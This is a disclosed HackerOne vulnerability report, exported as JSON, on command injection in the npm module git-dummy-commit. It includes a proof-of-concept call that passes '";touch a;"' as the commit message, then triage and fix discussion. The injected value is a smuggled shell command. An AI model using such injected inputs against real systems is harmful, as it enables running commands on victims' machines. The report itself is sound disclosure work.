{"id":341710,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDE3MTA=","url":"https://hackerone.com/reports/341710","title":"[git-dummy-commit] Command injection on the msg parameter","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2018-04-22T03:26:03.610Z","submitted_at":"2018-04-22T03:26:03.610Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"caioluders","url":"/caioluders","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/127/884/dc42ad1f26281d390990096c4ec2fc5c20c2a31b_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2018-3785"],"singular_disclosure_disabled":false,"disclosed_at":"2018-06-15T21:59:11.029Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2018-06-15T21:58:55.080Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi there, I've found a Command Injection on the \"git-dummy-commit\" module.\n\n# Module\n\n**module name:** git-dummy-commit\n**version:** 1.3.0\n**npm page:** https://www.npmjs.com/package/git-dummy-commit\n\n## Module Description\n\n\u003e Create a dummy commit for testing\n\n## Module Stats\n\n[62] downloads in the last day\n[94] downloads in the last week\n[384] downloads in the last month\n[6078]  downloads in the last year\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe module appends the `msg` parameter to a command on the [line 37](https://github.com/stevemao/git-dummy-commit/blob/master/index.js#L37)  without escaping it, leading to a command injection.\n\n## Steps To Reproduce:\n\n* Install the module \n\n```\n$ npm install git-dummy-commit\n```\n\n* Example code with the malicious payload `\";touch a;\"` on line 3.\n\n```javascript\nconst gitDummyCommit = require('git-dummy-commit');\n\ngitDummyCommit('\";touch a;\"');\n```\n* Run it.\n\n```\n$ node index.js\n```\n\n* Check the newly create file `a` \n\n```\n$ ls\na\t\tindex.js\n```\n\n## Patch\n\nIt is advisable to use a module that explicitly isolates the parameters to the `git` command.\n\n**( contacted the maintainer || opened issue ) = False**\n\n## Impact\n\nAn attacker that controls the `msg` parameter can injection command on the victim's machine.","vulnerability_information_html":"\u003cp\u003eHi there, I\u0026#39;ve found a Command Injection on the \u0026quot;git-dummy-commit\u0026quot; module.\u003c/p\u003e\n\n\u003ch1 id=\"module\"\u003eModule\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e git-dummy-commit\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e 1.3.0\u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ca title=\"https://www.npmjs.com/package/git-dummy-commit\" href=\"/redirect?url=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fgit-dummy-commit\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.npmjs.com/package/git-dummy-commit\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"module-description\"\u003eModule Description\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eCreate a dummy commit for testing\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ch2 id=\"module-stats\"\u003eModule Stats\u003c/h2\u003e\n\n\u003cp\u003e[62] downloads in the last day\u003cbr\u003e\n[94] downloads in the last week\u003cbr\u003e\n[384] downloads in the last month\u003cbr\u003e\n[6078]  downloads in the last year\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003cp\u003eThe module appends the \u003ccode\u003emsg\u003c/code\u003e parameter to a command on the \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fstevemao%2Fgit-dummy-commit%2Fblob%2Fmaster%2Findex.js%23L37\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eline 37\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e  without escaping it, leading to a command injection.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eInstall the module \u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ npm install git-dummy-commit\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eExample code with the malicious payload \u003ccode\u003e\u0026quot;;touch a;\u0026quot;\u003c/code\u003e on line 3.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003egitDummyCommit\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003egit-dummy-commit\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003egitDummyCommit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;;touch a;\u0026quot;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eRun it.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ node index.js\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eCheck the newly create file \u003ccode\u003ea\u003c/code\u003e \u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ ls\na       index.js\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"patch\"\u003ePatch\u003c/h2\u003e\n\n\u003cp\u003eIt is advisable to use a module that explicitly isolates the parameters to the \u003ccode\u003egit\u003c/code\u003e command.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003e( contacted the maintainer || opened issue ) = False\u003c/strong\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn attacker that controls the \u003ccode\u003emsg\u003c/code\u003e parameter can injection command on the victim\u0026#39;s machine.\u003c/p\u003e\n","weakness":{"id":59,"name":"OS Command Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-07-15T21:58:55.249Z","allow_singular_disclosure_after":-77528412.38208194,"singular_disclosure_allowed":true,"vote_count":4,"voters":["herrera","bl4de","eveeez","an0nym0us"],"severity":{"rating":"critical","score":10.0,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"none","availability":"high"}},"structured_scope":{"databaseId":10862,"asset_type":"SOURCE_CODE","asset_identifier":"git-dummy-commit","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2652549,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @caioluders i,\n\nThanks for reporting this issue.\n\nI was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.\nI will invite the package maintainer to this issue.\n","markdown_message":"\u003cp\u003eHi @caioluders i,\u003c/p\u003e\n\n\u003cp\u003eThanks for reporting this issue.\u003c/p\u003e\n\n\u003cp\u003eI was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.\u003cbr\u003e\nI will invite the package maintainer to this issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-04-23T06:30:19.445Z","updated_at":"2018-04-23T06:30:19.445Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2652552,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-04-23T06:31:18.590Z","updated_at":"2018-04-23T06:31:18.590Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2729660,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Since the author didn't join the report I opened a security issue in the repo.","markdown_message":"\u003cp\u003eSince the author didn\u0026#39;t join the report I opened a security issue in the repo.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-11T15:31:50.886Z","updated_at":"2018-05-11T15:31:50.886Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2734887,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-13T04:09:14.796Z","updated_at":"2018-05-13T04:09:14.796Z","actor":{"username":"stevemao","cleared":false,"url":"/stevemao","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2734900,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry for the late reply. I just opened a PR:\nhttps://github.com/stevemao/git-dummy-commit/pull/2","markdown_message":"\u003cp\u003eSorry for the late reply. I just opened a PR:\u003cbr\u003e\n\u003ca title=\"https://github.com/stevemao/git-dummy-commit/pull/2\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fstevemao%2Fgit-dummy-commit%2Fpull%2F2\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/stevemao/git-dummy-commit/pull/2\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-13T04:22:40.644Z","updated_at":"2018-05-13T04:22:40.644Z","actor":{"username":"stevemao","cleared":false,"url":"/stevemao","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2736730,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-13T17:20:30.849Z","updated_at":"2018-05-13T17:20:30.849Z","additional_data":{"old_severity":"High","new_severity":"Critical (10.0)","old_severity_id":143856,"new_severity_id":153101},"actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2825286,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@stevemao I commented on that PR and I think you still need to resolve it.\n@caioluders could you also review and add any comments?\n","markdown_message":"\u003cp\u003e\u003ca href=\"/stevemao\"\u003e@stevemao\u003c/a\u003e I commented on that PR and I think you still need to resolve it.\u003cbr\u003e\n\u003ca href=\"/caioluders\"\u003e@caioluders\u003c/a\u003e could you also review and add any comments?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-31T19:24:34.230Z","updated_at":"2018-05-31T19:24:34.230Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2827052,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Just made a comment there. Just isolate the parameters","markdown_message":"\u003cp\u003eJust made a comment there. Just isolate the parameters\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-01T00:03:22.384Z","updated_at":"2018-06-01T00:03:22.384Z","actor":{"username":"caioluders","cleared":true,"url":"/caioluders","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/127/884/dc42ad1f26281d390990096c4ec2fc5c20c2a31b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2891779,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","markdown_message":"","automated_response":false,"created_at":"2018-06-15T21:52:53.750Z","updated_at":"2018-06-15T21:52:53.750Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"old_scope":"Other module","new_scope":"git-dummy-commit","genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2891785,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"@stevemao I will disclose the report due to the time we've held it back.\nWill appreciate if you can move forward with releasing the fix and we will happily update the vulnerability report as well.","markdown_message":"\u003cp\u003e\u003ca href=\"/stevemao\"\u003e@stevemao\u003c/a\u003e I will disclose the report due to the time we\u0026#39;ve held it back.\u003cbr\u003e\nWill appreciate if you can move forward with releasing the fix and we will happily update the vulnerability report as well.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-15T21:58:47.839Z","updated_at":"2018-06-15T21:58:47.839Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"caioluders","url":"/caioluders"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2891786,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-06-15T21:58:55.123Z","updated_at":"2018-06-15T21:58:55.123Z","first_to_agree":true,"actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2891788,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2018-06-15T21:59:10.880Z","updated_at":"2018-06-15T21:59:10.880Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}